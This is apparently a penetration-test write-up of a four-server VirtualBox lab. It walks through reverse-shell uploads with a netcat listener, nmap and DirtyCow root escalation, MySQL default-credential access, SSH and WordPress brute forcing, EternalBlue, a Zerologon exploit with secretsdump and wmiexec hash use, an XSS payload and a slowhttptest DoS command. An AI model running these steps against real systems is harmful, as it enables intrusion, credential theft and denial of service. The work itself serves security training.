# Network-PenTest-Project

## Objectives
- Appraise the security posture of the network by analysing the configuration of network security devices and web applications, and identify
vulnerabilities that could lead to unauthorized access or data breaches.
- Demonstrate vulnerability exploitation techniques to highlight the potential impact of identified weaknesses.

## Scope 
**Network Address:** 172.16.5.0/24

|  Asset (OS/arch)         | IP Address    |
|-------------------------|---------------|
| Server 1 (Linux/32-bit)         | 172.16.5.5    |
| Server 2 (Linux/64-bit)         | 172.16.5.10   |
| Server 3 (Windows 2012/64-bit)  | 172.16.5.11   |
| Server 4 (Windows 10/64-bit)           | 172.16.5.13   |

## Tools Used
The lab setup consists of four individual virtual machines running on VirtualBox. Testing will be conducted from a Kali virtual machine.
| Tool                     | Usage                           |
|--------------------------|---------------------------------|
| Nmap                      | Network scanning                |
| Gobuster                  | Directory enumeration|
| Netcat                    | Network utility                  |
| Hydra/Medusa              | Brute forcing credentials       |
| Metasploit                | Vulnerability exploitation      |
| Slowhttptest              | DoS simulator                   |

## Findings and Steps 
### Server 1 Findings
#### Finding 1: TWiki Insecure File Upload (CVE-2006-3336)
Run `gobuster dir -u <TARGET IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt` to enumerate the directories of the webserver (use any appropriate wordlist).

![image](https://github.com/user-attachments/assets/66c929a2-ce6a-4d0f-ae08-457b942e84cc)

Explore the URLs found by Gobuster and navigate to `http://172.16.5.8/twiki/bin/view/Main/WebHome` which has a file upload functionality using the ‘Attach’ button.

Upload any reverse shell script on the webpage. TWiki attempts to filter uploads to prevent executable scripts from getting executed by appending a .txt extension to the file, but this can be easily bypassed by using a double extension on the file such as ‘reverseshell.php.txt’.
Start a listener on your machine with `nc -lvnp [port]` specifying the same port number used in the reverse shell script.

Navigate to the uploaded file URL to execute the script and establish a reverse shell on your local machine.

![image](https://github.com/user-attachments/assets/fa463564-a7bf-446d-99e4-2f9c7df5c456)

<br>

#### Finding 2: Privilege Escalation via NMAP setuid
After creating and executing the reverse shell from Finding 1, we are presented with a shell allowing for remote command execution as a lower privilege user ‘www-data’
To escalate privileges to root, enter the command `nmap –interactive` to exploit the older version of Nmap which allows execution of shell commands within its interactive mode. Then use `!sh` to drop into a command line as root user.

![image](https://github.com/user-attachments/assets/2f2f0a25-98ed-47a0-b3b1-c7c22428efd0)

<br>

#### Finding 3: Insecure NFS Export Configuration
The `showmount -e <TARGET IP>` command is used to query the remote NFS server to display its export list. The output indicates that the directory `/home/johnsmith` on the server is exportable and accessible to all clients on the network via mounting.

![image](https://github.com/user-attachments/assets/dc3b6fb0-c8ca-438d-8952-762584dbf0af)

It is hence possible to mount this directory to the local machine by creating a temporary directory and using the command `mount 172.16.5.8:/home/johnsmith /tmp/mount` to mount the directory from the server.

![image](https://github.com/user-attachments/assets/27a93d40-c203-47a1-ab81-63752d57e573)

After mounting the directory, it is possible to verify permissions by creating a new file and checking its ownership. 

![image](https://github.com/user-attachments/assets/79573c32-05e4-4732-9058-303a677ba330)

Since the server has ‘no_root_squash’ enabled in its NFS configuration, the file will have ‘root:root’ ownership, confirming root privileges within the directory. This allows anyone in the network to execute privileged actions in the directory, such as creating and running a shell script on the server as a root user. However, this step is not demonstrated as we have already achieved this capability in Finding 2.

<br>

#### Finding 4: MySQL Default Credential Usage
Run `mysql –ssl=0 -h <TARGET IP> -u root -p` to attempt to authenticate to MySQL using the username ‘root’ and the default blank password. A successful connection alleviates the need to try brute forcing credentials due to the use of default credentials. 

![image](https://github.com/user-attachments/assets/ac21001f-617a-4e86-9db1-5e94bcf8d7d8)

The entire database of the server can be readily queried for sensitive information, allowing for the modification and export of such data. A simple search uncovers several user accounts, including administrative accounts with plaintext passwords, and credit card details, constituting a severe breach of GDPR and PCI-DSS compliance.

![image](https://github.com/user-attachments/assets/18bb592f-04ba-41f9-baa3-d84a176c9587)
![image](https://github.com/user-attachments/assets/90f3ab84-3c2c-48aa-b262-59de9c27c862)

<br>

#### Finding 5: Weak SSH Credentials
Investigate the `/etc/passwd` file as it contains information about user accounts on a Unix or Linux system. 

![image](https://github.com/user-attachments/assets/4c45bef2-3bcb-4a62-9990-13d7239b7d93)

Use `awk -F: '($7 == "/bin/bash" || $7 == "/bin/sh") { print $1 }' /etc/passwd` to filter users with valid login shells (e.g., /bin/bash, /bin/sh) as they are likely candidates for SSH access.

Then use `awk -F: '{ print $1 }' /etc/passwd` to extract only usernames and add to a text file for brute forcing

Use this command to brute force SSH logins based on the given wordlists `medusa -U users.txt -P /usr/share/wordlists/fasttrack.txt -h <TARGET IP> -M ssh`

![image](https://github.com/user-attachments/assets/5fc1f9d1-b3bc-4082-824e-9d1ca55976e5)

<br>

### Server 2 Findings
#### Finding 6: Weak WordPress Admin Credentials
Run `gobuster dir -u <TARGET IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt` to enumerate the directories of the webserver (use any appropriate wordlist).

![image](https://github.com/user-attachments/assets/27e2497a-c78a-4531-a3dc-d6f7bc468ad2)

Navigate to `http://172.16.5.10/wp-admin/` which is a WordPress admin panel for the server. Through trial and error with various common usernames, error messages reveal the existence of the ‘admin’ account. At this point, the Metasploit auxiliary module ‘scanner/http/wordpress_xmlrpc_login’ can be utilized to brute force the login.

Set options as shown and start the exploit. The password is found to be ‘12345678’. The admin WordPress account of the server is now accessible.

![image](https://github.com/user-attachments/assets/3e3e4a4a-b2a2-4b6d-9a40-e566d162399d)

<br>

#### Finding 7: WordPress Insecure File Upload (CVE-2021-24962)
Navigate to Plugins > Add New > Upload > Browse and select the reverse shell script found from the local machine (found on kali in `/usr/share/webshells/php/php-reverse-shell.php`) after modifying the IP address and port number as necessary and click ‘Install Now’. Although an error message saying ‘The package could not be installed’ is received, the uploaded file can be found under Media Library in the sidebar menu.

![image](https://github.com/user-attachments/assets/8c362037-4a0b-486d-8c19-ec55b9cbbdeb)

Click on the uploaded file to see the uploaded file URL and navigate to it to execute the reverse shell after starting the listener.

![image](https://github.com/user-attachments/assets/9419137a-a0ef-42be-acdc-2ddab0f482a2)
![image](https://github.com/user-attachments/assets/3bcea178-39a4-44bc-876b-b341ad1c816e)

<br>

#### Finding 8: Privilege Escalation using DirtyCow vulnerability (CVE-2016-5195)
A simple google search of the kernel name and version of the target machine reveals that it is vulnerable to the dirtycow linux privilege escalation attack.

Download the ‘Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)’ exploit from exploit-db.com and upload it on the server using the same method as Finding 7.

![image](https://github.com/user-attachments/assets/12e175bc-4592-4191-ba28-24a3d571d432)

Take note of the location of the uploaded file as this is where the exploit is uploaded on the server. Start the reverse shell and navigate to the location of the file, which in this case is `/var/www/wp-content/uploads/2024/05`

Run the following commands at the file location:

`ls` – shows the exploit file uploaded onto the server.

`gcc-4.8 40616.c -lpthread -o dirtycow` - compiles the Dirty COW exploit code from the file using GCC version 4.8 (the only compatible version installed on the server), links it with the pthread library, and outputs the executable named ‘dirtycow’.

`./dirtycow` – executes the exploit file

`echo 0 > /proc/sys/vm/dirty_writeback_centisecs` – turn off periodic writeback to make the exploit stable. 

`whoami` – shows the current user which is now root.

![image](https://github.com/user-attachments/assets/b74b2578-b61f-4759-b029-24117c3c401f)

<br>

### Server 3 Findings 
#### Finding 9: Remote Code Execution via EternalBlue exploit (CVE-2017-0144)
Use Metasploit ‘windows/smb/ms17_010_eternalblue’ module to gain system access to the Active Directory. Set the RHOSTS to the IP of the target and run the exploit. A meterpreter shell is opened with System privileges.

![image](https://github.com/user-attachments/assets/27e4db34-a34a-4f6e-bcd9-692bfe07d3d9)

<br>

#### Finding 10: Remote Code Execution via Zerologon vulnerability (CVE-2020-1472)
Clone the latest version of impacket using `git clone https://github.com/SecureAuthCorp/impacket` and `cd` into the impacket directory.

Clone the Zerologon exploit script using `git clone https://github.com/VoidSec/CVE-2020-1472`

Find out the domain controller name using `nbtscan <TARGET IP>` and then run 

`python3 cve-2020–1472-exploit.py -n <DC-NAME> -t <IP-Target>` - which is the exploit script

`python3 secretsdump.py -no-pass -just-dc <Domain>/<DC-Name>\$@<IP-Target>` - to obtain the hash 

`python3 wmiexec.py -hashes <hash-value> <domain>/<User>@<IP-Target>` - to open the shell

Though this demonstration of gaining remote access to the server may seem redundant after Finding 9, KVBizz expressed significant concern about the potential remote control of their Active Directory. It is highly concerning that there are two simple methods to achieve this, and while only these two were demonstrated, other methods such as the EternalRomance RCE vulnerability (CVE-2017-0145) exist as well.

![image](https://github.com/user-attachments/assets/c30f11da-6131-485c-ad13-24f4207a3153)
![image](https://github.com/user-attachments/assets/26f4cb0e-25c1-41b8-8d15-1974901dd38d)
![image](https://github.com/user-attachments/assets/fa9d2c55-aa0b-46bc-ab71-c8dc13d36838)

<br>

### Server 4 Findings
#### Finding 11: Reflected Cross-Site Scripting (XXS) 
Access the webpage at the webserver IP and enter the XSS payload in the input field of the form and submit. 

The simple payload used for demonstration purposes was `<script>alert('Cross site scripting attack')</script>`

![image](https://github.com/user-attachments/assets/b1f96e51-3f2f-4d5f-a9cb-72b7e84adef9)

<br>

#### Finding 12: Denial of Service (DoS)
Use command `slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://<TARGET-IP>` to simulate the DoS attack on the server.

![image](https://github.com/user-attachments/assets/c64100f7-0bf6-4ca9-9d46-594067985f97)

<br>

#### Finding #13: Expired SSL/TLS certificates 

<br>

#### Finding #14: Unencrypted Clear Text Login for IMAP, POP3, and FTP


